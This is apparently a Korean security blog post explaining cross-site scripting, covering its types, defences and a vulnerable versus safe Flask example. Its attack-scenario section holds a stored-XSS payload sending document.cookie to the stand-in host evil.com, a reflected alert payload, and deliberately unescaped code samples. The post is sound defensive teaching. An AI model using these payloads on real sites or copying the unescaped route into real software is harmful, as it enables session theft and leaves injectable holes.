---
layout: post
title:  XSS 취약점
date:   2025-06-19
category: security
image: assets/img/blog/image.png
author: 최진혁
tags: xss, web-security
---

### XSS란 무엇일까요?

* **정의:** XSS(Cross-Site Scripting)는 웹 페이지에 사용자가 입력한 내용을 필터링 없이 그대로 출력할 때, 공격자가 악성 스크립트를 삽입하여 다른 사용자의 브라우저에서 실행되도록 하는 취약점입니다.
* **영향:**  
    * **쿠키·세션 탈취:** `document.cookie` 등을 통해 인증 정보가 외부로 전송될 수 있습니다.  
    * **피싱·UI 변조:** 페이지 내용을 조작해 가짜 로그인 폼이나 입력창을 띄울 수 있습니다.  
    * **권한 상승:** 악성 스크립트를 통해 관리자 기능을 탈취하거나 실행할 수 있습니다.

---

## 2. XSS의 유형

1. **Stored XSS (영구형):**  
   공격 코드를 데이터베이스, 게시판, 댓글 등에 저장해 다른 사용자가 접근할 때마다 실행되도록 함.  
2. **Reflected XSS (반사형):**  
   URL 파라미터나 폼 입력값에 공격 코드를 넣으면 즉시 응답 페이지에 반영되어 실행됨.  
3. **DOM-Based XSS:**  
   클라이언트 측 자바스크립트에서 `innerHTML`, `document.write` 등을 통해 동적으로 삽입 시 발생.

---

## 3. 공격 시나리오

- **Stored XSS 예시:**  
  게시판에 `<script>new Image().src="https://evil.com/steal?c="+encodeURIComponent(document.cookie)</script>` 를 남기면, 모든 방문자가 쿠키를 탈취당함.
- **Reflected XSS 예시:**  
  `https://victim.com/search?q=<script>alert('XSS')</script>` 링크를 열 때마다 스크립트가 즉시 실행됨.
- **DOM-Based XSS 예시:**  
  `document.getElementById('output').innerHTML = location.hash.substring(1);` 코드가 `<div id="output">`에 해시값을 그대로 출력.

---

## 4. 방어 방법

1. **출력 시 이스케이프 처리**  
   모든 사용자 입력값을 HTML 특수문자로 변환(`&lt;`, `&gt;`, `&quot;`, `&#x27;` 등).
2. **Content Security Policy (CSP) 적용**  
   인라인 스크립트나 외부 스크립트 로딩을 엄격히 제한.
3. **HTTPOnly & Secure 쿠키**  
   `document.cookie` 접근을 차단하고 HTTPS 전송만 허용.
4. **라이브러리 활용**  
   React/Vue 같은 프레임워크의 자동 이스케이프 기능 또는 OWASP ESAPI 사용.

---

## 5. 예시 코드 (Flask + Jinja2)

```python
# 취약한 코드: 필터링 없이 바로 출력
@app.route('/search')
def search():
    query = request.args.get('q')
    return f"<h1>검색 결과: {query}</h1>"

# 안전한 코드: Jinja2 자동 이스케이프 활용
@app.route('/search-safe')
def search_safe():
    query = request.args.get('q')
    return render_template('search.html', query=query)
```

```html
<!-- templates/search.html -->
<!DOCTYPE html>
<html>
  <head><meta charset="utf-8"><title>검색</title></head>
  <body>
    <h1>검색 결과: {{ query }}</h1>
  </body>
</html>
```

---

XSS는 단순하지만 가장 흔하게 발견되는 취약점 중 하나입니다.  
작은 실수 한 번이 큰 보안 사고로 이어질 수 있으니, 언제나 입력값을 믿지 말고 “출력 시 반드시 이스케이프!”를 기억하세요.  
